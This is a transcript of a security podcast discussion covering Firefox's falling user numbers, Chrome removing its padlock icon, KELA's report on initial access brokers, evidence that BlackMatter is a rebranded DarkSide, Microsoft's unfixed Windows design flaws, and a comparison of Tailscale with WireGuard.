STEVE:  As a percentage, yes, it is.  So they started out on January 27th of 2019 at 250, nearly 254 million active users.  They are now, as of July 25th, 2021, just a couple weeks ago, just they dropped below 200 million - 197,874 million.  So, and, you know, I guess I'm not surprised.  Chrome is strong.  People who may have been in Firefox to be the counter-browser, they're now able to go to many Chromium browsers.  I don't know, it would be interesting to know where these people went, and why.



My feeling is, you know, we always talk about this notion of a hard floor, is there like a hard ceiling or a hard floor above which something won't go or below which something won't go.  My guess is there is a hard floor on this, that is, there are users who were on Firefox because someone told them they should be once upon a time, or something they needed to do didn't work on Firefox where it did on Chrome, or they got moved over because of the pandemic because someone said, oh, no, you've got to use Zoom with Chrome, and then they just sort of stayed there.  I mean, who knows?  It would be really interesting if there was some way to track the rationale for it.  But I just sort of, because we talk about browsers a lot, browsers are important, I thought it was worth noting that this happened.



LEO:  Yeah.



STEVE:  And, boy, we really don't want a browser monoculture.



LEO:  No, no.  That's the really important thing.  And I feel a little guilty because I am not in that category.  I actively chose Firefox to support open source and to support a diverse ecosystem.  And I have switched, as well.  And the reason I think is, unfortunately, so many sites don't work unless you're using Chromium or a Chromium derivative.



STEVE:  Is that true?  Because I've not hit any.



LEO:  A lot of the sites - it's mostly commercial sites, video, stuff like that.  And I'm increasingly having difficulty using Firefox.  And the thing is, I'm using Vivaldi now, which is still, you know, it's a Chromium derivative, but it has a lot of nice features.  But it just - it's easier.  Yeah, see, you don't do, like, it's not unusual that you'll use, for instance, when I do the training for Premiere Networks, Chrome's required.  A lot of RTC-style video clients just don't work as well if you're not using Chromium.  I mean, it's a shame.  It really is a shame.



STEVE:  It is.  And we have seen all of the...



LEO:  And I feel bad.



STEVE:  We've seen all the other independent browsers just give up, right, and switch to Chromium.  And our podcast generates takeaways, in general.  And certainly among those, near the top, is how difficult it is to do a browser.  It's like China saying they're going to do their own OS.  It's like, no, you're not.  You know.  Nobody can do - you just don't do an OS anymore.  It's too late.  You take Linux, and then you do some things to it call it your own.  And similarly, you take Chromium, the Chromium core, and do some things to it, and call it your own browser.  It's like, okay, we like the features that Brave has, or we like the features that Vivaldi has.  But they have a common core.



LEO:  Yeah, unfortunately.



STEVE:  Except for Firefox.  Except for Firefox.



LEO:  The other thing I'm a little mad at Firefox because they abandoned progressive web apps, which I think is really important.  And so Chrome supports that.



STEVE:  Really.  I didn't realize that.  I heard you mention that, and I thought, wait, I thought Firefox did support them.



LEO:  I thought they did, too.  So, I mean, it's not completely our fault if they're an open source browser and they're not supporting these technologies that are good for open source.



STEVE:  And they're still getting a lot of money from Google.



LEO:  Oh, yeah.  They're basically a Google subsidiary.



STEVE:  Right.  Because it's...



LEO:  It's a search engine.



STEVE:  Right.  I was just going to say, right, right, right.



LEO:  It's affiliate fees from Google.  It's millions, hundreds of millions of dollars a year.



STEVE:  Hundreds.  It's like 500 million or something like that.



LEO:  Yeah, yeah.  And by the way, so does Apple.  Apple gets billions.  So Google pays a lot of money to keep people using their services.  Yeah, it's very difficult politically for me.  It's very difficult.  But ultimately I have to opt for the ease of use.



STEVE:  Well, and the problem is, yes, I completely, obviously, sympathize.  If there's something that you want to do, and the browser doesn't, then you go find one that does.  I mean, it's not like there's, for most people, there's no compelling reason to use Firefox unless you have some anti-Google, anti-Chrome...



LEO:  Yeah, that's a good reason.  That's a hell of a good reason.  And, you know, I guess Chromium is open source, I mean, it's developed mostly by Google employees, but it is open source, and so a Chromium-based browser like Edge or Brave or Vivaldi is still at least using open source technology.



STEVE:  Well, and how many zero days has the Chromium had?



LEO:  Oh, yeah.  A lot this month, 13.



STEVE:  Which affects every single browser which is based on the Chromium engine.  So that's of course the danger of the monoculture is that you end up with a position, you know, like what we have with Windows desktop, frankly, where problems can be devastating because everybody's using the same one.  But it seems inevitable, and I can understand, I mean, I wouldn't want to be responsible for a browser these days.  Performance and bugs and capabilities and the feature spread, it's not easy.



Speaking of Chromium, Google will finally be assuming HTTPS in their UI.  We're all currently, those of us who are updated on the latest Chromium, or Chromium and Chrome browser, we're at release 92.  And as you surf around in these post-Snowden days, you'll most likely be, well, you'll always be seeing a little black padlock.  They didn't spend any extra pixels or nuance on this thing.  This is just the simplest, flattest, most uninspired black padlock, probably because they know it's about to fade away, that you could have.  Anyway, it's there, to the left of all the URLs you go.  Unless you somehow arrange to land on - and I'm told there's like 10% of sites that are still not HTTPS.  None that I ever visit.  I don't know where they're hiding.  I had to go, like, search for one.



And just as a little tip for our users, http://neverssl.com is your trusted source for a non-SSL/TLS connection.  Neverssl.com.  Reminds me of Never10, my little gizmo that disarmed Microsoft from pushing Windows 10 on everybody who was happily using 7 or 8 at the time.  Anyway, I had to go find it because I wanted to take a screenshot of what Google shows, what the Chrome browser shows when you are at a non-TLS-encrypted connection.  And it's prominent.  It says "Not Secure."  And of course that's always annoyed me also because there are legitimate use cases for a site not having TLS, you know, being HTTP-only, if it's just like an old-school pure, like, pages that lay there.  You can't create a session.  There's no cookies that it's holding for you.  There's no login.  You just click on things, and you look at different pages.  There's, like, zero reason to secure that.  There's no transactions.  There's no cookies.  There's nothing that needs to be kept secure.  But Chrome says "Not Secure."  Well, right.  But also no need for security.



Anyway, the point is with the next release, 93, of Chrome, the little black padlock, for which hopefully they didn't pay anybody much, it's going away.  So you will no longer see a padlock of any kind, anywhere, in the default case of secure because, yeah, everything is.  You'll still get that "Not Secure" if by some strange happenstance you go somewhere that doesn't have HTTPS, like you went deliberately to Neverssl.com.  You'll still get it.  But anyway, the point is no more padlock.  It's going away.  That's just the way the world is now secure. Thank you, Edward, for helping us get there.



Okay.  As we know, unfortunately, ransomware has rapidly grown into an established and entrenched form of cybercrime that's not going away anytime soon.  As a consequence, it forms an unapologetic large percentage of today's podcast.  The first aspect of specialization that emerged was the idea of separating the developers of the ransomware from its use to attack victims.  Some evil genius somewhere conceived of the notion of Ransomware as a Service, and that just took off.  It created the so-called affiliates who would perform the attacking using ransomware that they'd essentially rented.  You know, basically for a piece of the action they'll go do that work.



It wasn't long before the affiliate role also split and further specialized into so-called Initial Access Brokers, or sometimes Initial Network Access Brokers and pared down the affiliates who now purchased access to the enterprises that they wanted to get into from a third party.  So now we've got an additional player by cracking that apart. 



Yesterday, the cybersecurity firm KELA, that we've never referred to before, K-E-L-A, and their domain name is Ke-la.com, they published a report documenting their year-long exploration into the dark web and specifically the nature of the market that's forming around these Initial Access Brokers.  Their report provided so much interesting detail that it was, until yesterday, originally going to be the main focus and topic of the podcast, since I think this is an interesting offshoot of the whole Ransomware as a Service happening.  But that plan was preempted by what did become today's main focus and topic, as I said, this really interesting interview and sort of the sense you take away from it.



So instead of digging deeply into every detail of what KELA found and reported, I'm going to summarize what they discovered about the nature of today's initial access broker market.  They framed their research by explaining.  They said:  "For more than a year, KELA has been tracking Initial Access Brokers and the initial network access listings that they publish for sale on various cybercrime underground forums.  Initial Network Access refers to remote access to a computer in a compromised organization.  Threat actors selling these accesses are referred to as Initial Access Brokers.  Initial Access Brokers play a crucial role in the Ransomware as a Service (RaaS) economy, as they significantly facilitate network intrusions by selling remote access to a computer in a compromised organization and linking opportunistic campaigns with targeted attackers, often ransomware operators themselves.



"The research includes an in-depth analysis of Initial Access Brokers and their activity for a full year, from July 1st of 2020 through June 30th of 2021.  KELA analyzed IABs' activities over the past year, when their role became increasingly more popular in the cybercrime underground and summarized five major trends that were observed throughout their analysis."



Okay.  So they have a set of bullet points as primary research takeaways.  They explored over a thousand access listings offered for sale over the last year.  The average price for network access during this period was 5,400 USD.  So $5,400 is the average price, while the median was $1,000.  The top affected countries are the U.S., France, U.K., Australia, Canada, Italy, Brazil, Spain, Germany, and the UAE.  IABs built a pricing model for initial access.  The most valuable offers include, not surprisingly, domain admin privileges on a computer within a company with hundreds of millions in revenue.  RDP and VPN-based access are the most common.



IABs find new attack vectors and accommodate the changing software targets of ransomware gangs, including network management software and virtual servers.  Successful IABs find regular customers, some of which are ransomware affiliates, and move most of their operations into private conversations.  They said, however, new actors continually enter the scene.  Some IABs adopted "ethics" - and I'll put that in quotes, right, because, okay, ethics for a cybercriminal - that were introduced by some ransomware gangs.



And we of course talked about those after the attacks which caused them to disappear.  "Namely," they said, "there's a certain criticism against actors trading access to healthcare companies, though it's still an initiative of a few actors and not a typical attitude."  So sort of a new thing that hasn't fully taken hold.  They said:  "IABs are eager to monetize their access and are using all means available to do so.  Some IABs were seen stealing data from the affected company themselves to gain profits even if the access is not purchased."  So that is to say, they're not solely selling access.  They may dip in a little bit themselves.



And, finally, "IABs have become professional participants of the RaaS (Ransomwhere as a Service) economy.  They constantly find new initial access vectors, expand the attack surface, and follow their customers' demands.  It requires network defenders to track IABs' activities and all other actors who have formed around this whole ransomware ecosystem."



So KELA found that, not surprisingly, an important metric for setting the access price is the level of privilege that the access enables, with domain admin access being the most expensive, costing at least 10 times - not surprisingly - 10 times more than access to a machine with standard user rights.  I would expect it to be way more than 10 times, but that's what they found.  The priciest offers from reputable threat actors KELA observed included access to - and these are specific instances - access to an Australian company with 500 million in USD revenue that enables an attacker with admin-level privileges, most likely domain admin.  That was offered for sale for 12 BTC, which at today's price is just shy of $500,000, $465,000 for a 500 million, okay, so that's half a billion dollar in U.S. revenue, Australian company.



Access through ConnectWise to a U.S. IT company was offered for 5 BTC, which puts it at about $200,000.  Access to a Mexican government body was offered for $100,000 USD which was used for the LockBit ransomware attack.  So this is interesting, too, because the fact that affiliates are purchasing access for some number of bitcoin means that they have an expense upfront associated with gaining access to the network that's been purchased.  Which means they have an incentive not to walk away from this.  They don't have zero dollars invested.  They've got some, you know, some bitcoin has been transferred in order for them to gain access.  So they're in there for some money, maybe as much as half a million dollars, in the case of that Australian company.



On the other hand, they got high-level access into that network.  They must have believed it was going to be worth, you know, they were going to be able to squeeze that company for some money.  So the dynamics of how this is evolving are interesting.  KELA is also seeing a diversification of access that is sort of access types as the market, such as it is, of illegal behavior is evolving.  That's the entire point of splitting off this IAB role.



So as I was saying, KELA is seeing a diversification of access that's being requested from the IAB guys.  Network access is loosely defined.  Threat actors use it to describe multiple vectors, permission levels, and entry points.  Over the course of this year, KELA observed that the most commonly offered access was RDP, of course, Remote Desktop Protocol, and VPN-based access.  So brute forcing attacks which suddenly succeed and then those credentials which are discovered go up on the dark web for sale.  Remote access can also be supplied through the ConnectWise and TeamViewer software, which can provide actors with RDP-like capabilities.  VPN access can be gained and sold through various software such as Citrix, Fortinet, and Pulse Secure VPN products.  And those have all been subjects of known vulnerabilities, which their parent companies have patched.  The question is, did their own customers update with those patches?  Those are all popular in the cyber underground.



In addition, IABs are finding new attack vectors and ways to supply access to buyers, meaning that the overall attack surface is expanding.  For example, and we'll actually come back to an instance of this later, access to VMware's ESX servers, which have recently become quite popular among ransomware attackers.  REvil and DarkSide both had custom versions of their malware specifically targeting the VMware ESX servers.  Tracking and counting IAB transactions is difficult because once an IAB's advertisement is responded to by a credible and interested buyer, in general nothing further appears - well, in the accessible dark web, I was going say the "public dark web," but the accessible dark web - after these guys take their communication private.



And it also appears that after the parties have first met through an advertisement, and a relationship is formed, the buyer may say that the quality of the access you're selling is good.  We'll buy anything else you have to sell for a fair price.  So let us know first, since we may pay top dollar, or top ruble, I guess.  So what happens is an IAB and somebody wishing to purchase access sets up a relationship where they say, you know, cool, the quality of your stuff is good.  We want to buy other access that you get in the future.  So that IAB may not continue advertising, if they've got a buyer that's willing to pay for all the access that they're able to discover.



KELA also confirmed the trend we've seen reported about the so-called "professional ethics," at least with regard to who is an acceptable victim.  Both their disbanding and disappearance that we saw with the DarkSide gang and their promise then not to target certain sectors.  This trend is spreading, and it's solidifying, although it's not yet established, and it varies depending upon the specific gang.  But there have been bans on attacking healthcare, government, education, and non-profit sectors so as not to cause damage to patients, students, and citizens, and other categories of people.  The ransomware gangs appear to be passing the message that they will only hunt companies and aim only for financial gain.  And we'll actually see a beautiful example of that in this dialogue interview at the end of the podcast.



In line with this, IABs have been seen posting access ads for victims from the healthcare sector, then later deleting the offers after receiving criticism from other users.  Like, you know, posted criticism saying, hey, you really shouldn't be pushing attacks on healthcare sectors.  And then they go, oh okay, well, shoot.  We could have gotten some money.



LEO:  Oh, shoot.



STEVE:  Yeah, shoot.  However, there are still no hard-and-fast rules on this matter, with most brokers being glad to sell all the access they're able to gain.  So, yeah, there are less - again, I hate to use the word "ethical" in this context.  But there are ransomware gangs that will attack anybody that they can get access to.  So that's the situation there.



Leo, after our second break, or after our first break, I want to talk about the return of DarkSide.



LEO:  Oh, boy.



STEVE:  Which didn't take long.



LEO:  Yeah, no kidding.  To me it's so interesting, and I don't think these guys are ethical ever.  I think they just say whatever Putin lets us do.



STEVE:  Yeah.



LEO:  We don't want to get in trouble with the GRU.  That would be, you know.



STEVE:  Yeah, well, I think that you make a very good point.  They didn't take themselves down.



LEO:  Yeah.



STEVE:  They got pushed off or taken down.  And so they're reemerging under a new name because, well, they can.



LEO:  And who knows?  You know, maybe their real ethical concern was they didn't want to pay the affiliate fees owed to the people who did the pipeline attack.  And so if we just disappear and rename, rebrand, no one will know.  Is surprise.



STEVE:  Yes, that's not DarkSide.  We're not them, no.



LEO:  Is not DarkSide.  No.



STEVE:  So, okay.  So as I'm explaining why the industry is virtually certain that we are witnessing the return of DarkSide, keep that in mind when we hear the guy from BlackMatter being interviewed, claiming that that's not the case.  Okay.  So as we know, an affiliate of the Ransomware as a Service group, which was at the time known as DarkSide, and "was" is the operative word here, made what turned out to be a big mistake by attacking critical U.S. infrastructure in the now-famous Colonial Pipeline attack that shut down the U.S.'s largest fuel pipeline, causing fuel shortages across the Eastern Seaboard of the U.S., and gained what I think you can fairly say would be unwanted attention to themselves.



Shortly afterward, DarkSide's ransomware operation suddenly shut down.  They lost access to their servers.  And at least some of their ill-gotten funds, their cryptocurrency, was seized.  We later learned that the FBI had somehow recovered 63.7 BTC of the approximately 75 which was the $4 million ransom payment made by Colonial Pipeline.  So a chunk of that was recovered.



Since ransomware, when it's done right, can generate so much money, no one thought for a moment that the culprits had learned their lesson and had decided to update their LinkedIn profiles and start interviewing for jobs in the Russian IT sector.  What we all thought was that they would return under another name, probably with at least the intention of not again stepping in such a big pile of trouble.  And sure enough, a recent detailed forensic analysis of the cryptographic algorithms being employed by an apparent newcomer that has named themselves BlackMatter, and that will be the interview that we share at the end, suggests that BlackMatter is actually DarkSide 2.0.  However, since this new group is soliciting initial access brokers themselves directly, it may be that they've scrapped their previous affiliate model, at least for the time being, probably in the interest of maintaining more control, and thus preventing a recurrence of the disaster that shut them down last time.



So this new BlackMatter group actively is, already, actively attacking victims and purchasing network access from other threat actors to launch new attacks.  Over the weekend, BleepingComputer reported that multiple victims have been targeted by DarkMatter with ransom demands ranging between 3 and $4 million, and that one victim had already paid a $4 million ransom to delete data that had been exfiltrated from their  network and to receive both a Windows and a Linux ESX, that's that VMware ESX decryptor.



So why do we believe that this is the work of DarkSide rebranded?  Over this past very busy weekend, Emsisoft's Fabian Wosar, who we've been talking about lately because he's been very active in this area, he tweeted, he said:  "After looking into a leaked BlackMatter decryptor binary, I am convinced," he tweeted, "that we're dealing with a DarkSide rebrand here.  Crypto routines are an exact copy pretty much for both their RSA and Salsa20 implementation, including their usage of a custom matrix."



Okay.  So what does he mean by that?  Salsa20 is a symmetric stream cipher.  And, as we recall from all the work we did talking about crypto years ago, what that means is that it XORs any data it's given, either for encryption or decryption, with the output of its cryptographically strong, pseudorandom bitstream generator.  As we know from our previous talk about this, and as counterintuitive as it may seem, simply inverting random bits of a plaintext, which is what XORing does, by essentially XORing the plaintext with noise, totally scrambles that plaintext to yield a cryptographically strong ciphertext.  Essentially, if you XOR something that has meaning with noise, you get noise as a result.  And when that noisy stuff, that ciphertext is later re-XORed with the same random bitstream, in other words, reinverting exactly the same inverted bits, naturally the original plaintext is restored.  That's Salsa20.



Okay.  So Salsa20's internal state, that is, the data that it stores and grinds on in order to produce this cryptographically strong pseudorandom bitstream, it's held as 16 32-bit quantities.  They are conceptually arranged in a 4x4 matrix.  The formal Salsa20 spec specifies how those 16 values are to be initialized.  This is specified sort of to create a standard implementation for inter-Salsa20 implementation compatibility.  Even though technically it's arbitrary.  So interlaced through four of those 16 32-bit values is the 16-character string "expand 32-byte k,"  That's all lowercase.  Expand space 32 hyphen byte space k.  In other words, just some constant stuff.  This is Dan Bernstein's construction.  He did Salsa20.



Two of the 16 32-bit values are used to specify a stream position.  So it's sort of a way of starting in different locations.  And of course since they're 32-bit values, and there's two of them, that's a 64-bit position, so plenty big.  Another two are nonces.  And the remaining eight 32-bit values are used to specify the key.  So that's the formal spec.  DarkSide, okay, the original DarkSide, blows all that off and simply initializes that entire block with random data.  It then encrypts that Salsa20 initial state matrix with a public RSA key, which is appended to the end of the encrypted file.  Fabian said that this implementation of Salsa20 was previously only ever seen by DarkSide's crypto.



And now this approach has resurfaced, unchanged, being used by BlackMatter.  Additionally, DarkSide's implementation of a 1024-bit RSA was also unique to their code, and BlackMatter also uses exactly the same unique implementation.  So, yeah, deep down in the crypto they're identical.  When we also consider that both groups use similar language and similar color schemes on their public and dark web sites, evidence that - oh, also they have a similar lust for media attention, and that the "new," in quotes, BlackMatter group is going to great pains this time to note that it will not target the oil and gas industry, and they specify pipelines and oil refineries - it seems about as certain as it could get that DarkSide has returned.



And at the end of this podcast, as I said, we're going to hear from a member of the group and see what they think of themselves.  They're not the only ones.  I wanted to also note because as things happen in the future we'll be referring to these gangs.  The DoppelPaymer group has renamed themselves Grief, which is what they give their victims.  It's just a simple rebranding.  There's really no big news about the group beyond the observation that, just sort of for the record, DoppelPaymer has become Grief.



None of these groups, like, say that they're, like, they don't declare that they've been rebranded and renamed.  But everything that they're doing is the same in the same way.  They don't, like, rewrite their code from scratch.  They don't, like, retranslate from their native Russian into English from scratch, probably because it's difficult to get English that they like.  So to anyone who's observing these guys from the outside, duh.  We can still see you.  We know who you are.  You changed your name, but nothing else changed.



LEO:  Isn't that cute.



STEVE:  Yes, they have, in this case, both groups had different-looking colored CAPTCHAS, but the code underneath was custom, and identical.  So did you forget to change, like, anything under the surface?



LEO:  Well, why change anything that works?  



STEVE:  Yes, exactly.  And finally, Avaddon has also become Haron, H-A-R-O-N.  So essentially I think what we're seeing here is there's been such a mess created by the REvil attacks and the DarkSide attacks that everybody, even if they weren't, like, attackers, everyone thought, oh.  Well, everybody else is changing their name.  We should, too.  And so they're doing this rebranding.  So from a podcast standpoint it's a little tricky because suddenly we're going to be talking about apparently new ransomware gangs.  Not so much.  They're just the same gang with a different name.



Okay.  I wanted to begin with a brief look back at the month we've just survived.  I found a nice set piece for this in the form of a little corner of GitHub which belongs to a guy named Christoph Falta, who's in Vienna, Austria.  He describes himself as - I think this was in his little short bio on GitHub:  "Random infosec guy.  Rainbow teamer.  Focusing on Windows security."  And his past work, which is also published on GitHub, clearly shows that he has an interest in Microsoft Windows Active Directory security issues.  So perhaps maybe he's a Security Now! listener.  He doesn't follow me on Twitter, so maybe not.  But I have many fewer Twitter followers than I know we have podcast listeners, so certainly not everyone who listens to the podcast follows me on Twitter.  And many of the listeners my age have grumbled and said, "I'm not doing any of that social media stuff."



So okay.  In any event, he seems to be channeling me on his latest page, which is titled "Microsoft Won't-Fix List, July 2021 Edition."  He updated the page just yesterday.  He posted on 08/02/2021.  He said:  "Update:  Thank you for all your feedback.  This list was intended to be a summary of what happened in July of 2021, and I decided I'll keep it that way because I honestly think I don't have the energy to maintain an up-to-date list of ALL [in caps] won't-fix issues Microsoft has to offer.  So I'll keep this remark here for clarity and change the description."  So then he said a growing list of design flaws Microsoft does not intend to fix.  "Since the number is growing, I decided to make a list."



And anyway, I'm not going to go through it all.  It's everything we've been talking about.  Basically the page consists of a table with its columns labeled "Vulnerabilities," "Associated/Assigned CVEs," "Attack Type Descriptions."  He has a column titled "It's NTLM again; right?" where in many of their entries are "Yup."  And then also he has "How it works, in a nutshell."  And basically he just goes through all the things that we talked about - PetitPotam, SeriousSAM, PrintNightmare, the ADCS problems.  He has two that we talked about that hadn't been named that have now been given a name by the security community, SpoolSample and RemotePotato0.  We've talked about all these things.



Anyway, it's just heartening for me to see that I at least was not alone in this overall sense I came away from July with, which I've been conveying through the podcast, that not only was July 2021 an unusually rough month for Microsoft, but that what appears to be emerging is a long-term problem with Microsoft's legacy protocols, which as I noted last week are all still enabled by default, just in case someone might need them; and that some of these problems work as designed, or as Christoph terms it in his CVE column, where there is no CVE because it's not a bug, it's a feature.  So, yeah, you're not going to assign a CVE to something that works as it's intended to and that isn't going to be changed.



So there is a larger takeaway from this that I just wanted to make a point of.  It's probably the case that the IT staff of many enterprises have become accustomed to assuming that whatever's wrong with Windows will be auto-patched as soon as Microsoft can get around to it.  And while that might not be soon enough, as it was in the case of the ProxyLogon debacle with Microsoft Exchange Server early this year, Microsoft does eventually get their machines patched.  So applying updates is clearly critical.  But the shift that July's revelations of significant problems which all work as designed creates, means now that simply applying Microsoft's monthly patches will no longer mean that an enterprise network is being kept safe and secure.  These things have diverged.  When Microsoft wrote, and they wrote it "vulnerable by design" in that announcement a couple weeks back, they meant it.  And that means that there's no patch forthcoming, late or ever.



So I just wanted to make sure that our listeners fully appreciated that we've entered a bit of a different world with this raft of discoveries throughout July, the publication and multiple proof-of-concepts of these vulnerabilities that Microsoft says they have no plans to fix because nothing's broken, in their view, despite the fact that somebody getting in can use these things to wreak havoc within an enterprise, and Microsoft's not going to change that.



So what's going to be needed is for those professionals who have been falling back on Microsoft's updates, figuring, okay, yeah, all I have to do is that, that's not going to be true.  For their enterprise's network security, they're going to need to go beyond pressing Microsoft's "update us" button and look carefully at what have become multiple edge cases and corner cases to determine how to set up their enterprise-wide policies to disable these dangerous features on a case-by-case basis.  And I thought I really needed to put a point on that to make sure people get it that something changed this past month, and not for the better, for Windows security.



Okay.  Something called Tailscale, T-A-I-L-S-C-A-L-E.  As we know, WireGuard is widely, and I think appropriately and accurately, regarded as the logical and overdue successor to the venerable OpenVPN, and even to some degree IPSec, inasmuch as it can replace them both.  OpenVPN, like OpenSSL, is suffering from its age and from the fact that it has been for decades the test bed for many experiments as we've been learning the right way to do things only after first doing many of those things wrong.  For example, TCP cannot be the protocol used by a VPN's tunnel.  We know that now.  It's not what it was designed for, and doing so is just wrong.  Yet OpenVPN offers the option.  So once all of the wrong solutions have been tried, and the right solutions have been found, it's really best to lighten one's load and just start over again from scratch with a blank slate that can host an entirely new design.  That's what Jason Donenfeld set out to create when he launched what has turned out to be the incredibly successful WireGuard project.



Exactly three years ago yesterday, it was yesterday three years ago, Linus Torvalds posted the following.  It happened to be in the subject under networking.  He said:  "BTW [by the way], on an unrelated issue," he said, "I see that Jason actually made the pull request to have WireGuard included in the kernel," meaning the Linux kernel.  He said:  "Can I just once again state my love for it" - okay, this is Linus; right?  He doesn't like anything.  "May I once again state my love for it and hope it gets merged soon?  Maybe the code isn't perfect, but I've skimmed it.  And compared to the horrors that are OpenVPN and IPSec, it's a work of art."



So of WireGuard, Wikipedia reminds us.  Wikipedia says:  "WireGuard is a communication protocol and free and open-source software that implements encrypted virtual private networks and was designed with the goals of ease of use, high-speed performance, and low attack surface.  It aims for better performance and more power saving than the IPSec and OpenVPN tunneling protocols.  The WireGuard protocol passes traffic over UDP."



It continues just a little bit more.  I'll say:  "In March 2020, the Linux version of the software reached a stable production release and was incorporated into the Linux 5.6 kernel and backported to earlier Linux kernels in some Linux distros.  The Linux kernel components are licensed under the GNU General Public License, GPLv2; other implementations are under GPLv2 or other free open source licenses."  And then what I loved about this is it said:  "WireGuard utilizes Curve25519 for key exchange, ChaCha20 for symmetric encryption, Poly1305 for message authentication, SipHash for hashable keys, BLAKE2 for cryptographic hash function, UDP-based only."



In other words, best of breed, one of each, period.  We're done, thank you very much.  There's no need for options.  There's no need to choose this or that.  We just did it once correctly.  And that of course is where it gets its benefit, right, is it's like it minimizes the attack surface; uses very robust, well-understood ciphers.  That's WireGuard.



Okay.  So I want to introduce everyone to Tailscale, which two of our listeners, Ben Hutton and Jack Hayter, that's just for the record H-A-Y-T-E-R, recently turned me onto.  A search on the phrase "WireGuard versus Tailscale" brought me to a page asking and answering exactly that question.  Should I use Tailscale or WireGuard to secure my network?  The answer is yes.



So I'll mention that Tailscale's founders are some highly credentialed ex-Google and Alphabet developers who go on to explain.  They're the founders of Tailscale.  They said:  "Tailscale is built on top of WireGuard.  We think very highly of it.  We designed Tailscale to make it easier to use WireGuard to secure your network connections.  You might decide to use WireGuard directly, without Tailscale.  This is a guide to using Tailscale versus configuring and running WireGuard directly."  So we sort of have Tailscale providing a connectivity and ease of use and additional capabilities layer, with WireGuard providing the super-secure packet level transport.



For configuration they explain:  "WireGuard is typically configured using the wg-quick tool.  To connect two boxes, you install WireGuard on each device, generate keys for each device, and then write a text configuration for each device.  The configuration includes information about the device - port to listen on, private IP address, private key and so forth; and information about the peer device - its public key, its endpoint where the peer device can be reached, private IPs associated with the peer device and so forth.  It's straightforward, particularly for a VPN.  Every pair of devices requires a configuration entry, so the total number of configuration entries does grow quadratically in the number of devices if they are fully interconnected to each other.  To connect devices using Tailscale, you install and log into Tailscale on each device.  Tailscale manages key distribution and all connections for you.  This can be particularly useful if some of the devices belong to non-technical users."



Regarding connectivity:  "WireGuard ensures that all traffic flowing through two devices is secure.  It does not ensure that those devices can connect.  That's up to you.  WireGuard has a persistent keep-alive option, which can also keep the tunnel open through NAT devices.  But in some cases, to ensure that your devices can communicate, you may need to open a hole in your firewall, or configure port forwarding on your router.  WireGuard can detect and adapt to changing IP addresses as long as a connection remains open, and both ends do not change addresses simultaneously.  Establishing a connection or reestablishing a broken connection requires updating configuration files."



Compared to Tailscale:  "Tailscale takes care of on-demand NAT traversal so that devices can talk to each other directly in most circumstances, without any manual configuration.  When NAT traversal fails, Tailscale relays encrypted traffic, so that devices can always talk to each other, albeit with higher latency in that one case.  There's no need to modify firewalls or routers.  Any devices that can reach the Internet can reach each other.  Tailscale traffic between two devices on the same LAN does not leave the LAN."



For security:  "Tailscale and WireGuard offer identical point-to-point traffic encryption."  Performance.  Oh, wait, I did skip something.  They said:  "Using Tailscale introduces a dependency on Tailscale's security.  Using WireGuard directly does not.  It's important to note that a device's private key never leaves the device, and thus Tailscale cannot decrypt network traffic.  Our client code is open source, so you can confirm that yourself.



"With the Team and Business plans, Tailscale adds an ACL" - so Access Control List - "layer on top of WireGuard, so that you can further control network traffic.  You can do some of this directly with WireGuard by not setting up tunnels between devices that should not communicate, or by using the operating system firewall to control traffic flow.  Tailscale ACLs allow you to express ACLs for everything in a single place using users, groups, and tags, which are easier to maintain than a list of which device pairs may communicate.  Even without the Team or Business plans, Tailscale offers some basic unidirectional ACL controls.  For example, any node may turn on 'Shields Up' mode, which prevents all incoming connections."



And of course I got a kick out of that.  And I should mention that Tailscale is completely free for personal use with a single user, and it offers single sign-on and multifactor authentication and will link up to 20 devices for free.  Multiple users, access control lists, advanced network segmentation and other group features are billed for the pay-for plan per user per month.



So, okay.  Just a couple last things.  Performance:  "Using WireGuard directly," they acknowledge, "offers better performance than using Tailscale.  Tailscale does more than WireGuard, so that will always be true.  We aim to minimize that gap, and Tailscale generally offers good bandwidth and excellent latency, particularly compared to non-WireGuard VPNs.  The most significant performance difference is on Linux.  On Linux, WireGuard is available as a kernel module.  Tailscale currently uses the user space WireGuard implementation, which has more overhead.  The most common scenario in which Tailscale users notice bandwidth or latency issues is when Tailscale is relaying network traffic, which is unavoidably slower.  In that case, the devices would be unable to connect at all using WireGuard directly, so no direct comparison is available."



And I'll just note that I think they're being a little bit excessively harsh on themselves.  I think they're trying to be scrupulously factual because any performance hit would be initial setup once you've established point-to-point link, except as that issue regarding Linux in user space versus the kernel.  I guess you could perform a benchmark yourself and see whether you see much difference.  I don't think you'll find much. 



And finally, bonus features.  They said:  "By design, WireGuard provides secure point-to-point communication.  It's intended to be a building block.  Tailscale has a broader set of features.  For example, we offer MagicDNS to make it easier to reach other devices on your VPN.  We have out-of-the-box support for subnet routing to allow employees access to an office network via an exit node running Tailscale.  And more features are in the works."



So the bottom line, they say:  "We suspect that using WireGuard directly will be most appealing if you have a small, stable number of Linux servers whose connections you want to secure.  Using Tailscale will make the most sense if you want things to just work, you are administering a VPN for many different users, or you want the extra features or centralized ACLs that Tailscale offers.  But everyone's network and needs are different.  And we've helped debug a lot of networks.  When we say everyone's network is different, we know whereof we speak, and we mean it.  Using WireGuard directly is a very reasonable choice; and if you're thinking about doing it, we encourage you to give it a try.  If you later decide that you want the convenience and extra features that Tailscale offers, it's easy to switch."



So I just wanted to make everyone aware of this.  I think it sounds like a very cool add-on, especially free for a single user who likes the idea of switching to WireGuard, but wants a little, you know, also likes the additional features, like that feature overlay that WireGuard offers.  And really I was reminded of CryptoLink, which was my project that was targeted doing exactly these things.  Except as we know I chickened out due to my concern that governments were eventually going to require that we refer, you know, we end up with what we would call "warrant-compatible encryption," and we still don't know how that's going to shake out.  But in any event, this looks like a beautiful solution.



I love the idea of having multisite networks statically glued to each other into a simple, big, privately routable network.  The downside, of course, is the threat presented by today's ransomware.  When you were talking about CrowdStrike earlier, Leo, I was thinking of exactly this problem.  You know, I'm unwilling to keep static links up between my various facilities.  I would love to just have my network here where I'm working part of the GRC network at Level 3.  But I just can't take the chance of having everything on the same network.



So what I do is I bring the link up when I need it and bring it down when I don't.  Of course you could also do that with WireGuard.  It's just nice to have everything glued together.  And I know there are lots of scenarios where it would make sense to do that.  You can imagine a corporate environment with satellite offices, or people at home who just want to tie their systems statically into a central enterprise hub.  So I just wanted to put it on everyone's radar.  It looks like a great offering.  Offers a useful package for free.  I think they were $5 per user per month for the first step up from the free package.  And for all of the extra controls that they offer, it might make sense for people.



LEO:  We're having some good conversations about WireGuard on our FLOSS Weekly show, if you're interested.



STEVE:  Yeah, good.  They really did, the WireGuard team, it ended up expanding beyond Jason.  And I would use it without any hesitation.



